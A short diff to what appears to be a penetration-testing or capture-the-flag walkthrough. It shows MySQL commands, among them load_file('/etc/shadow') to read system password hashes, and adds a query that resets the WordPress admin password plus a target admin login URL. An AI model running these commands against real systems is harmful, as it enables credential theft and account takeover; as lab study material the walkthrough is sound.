@@ -69,6 +69,10 @@ $ use books;
 $ select * from authors;
 
 $ select load_file(”/etc/shadow”)
+
+$ UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
+
+http://<TARGET-IP>/8585/wordpress/wp-admin
 ```
 
 --------------------------------------------------------------------
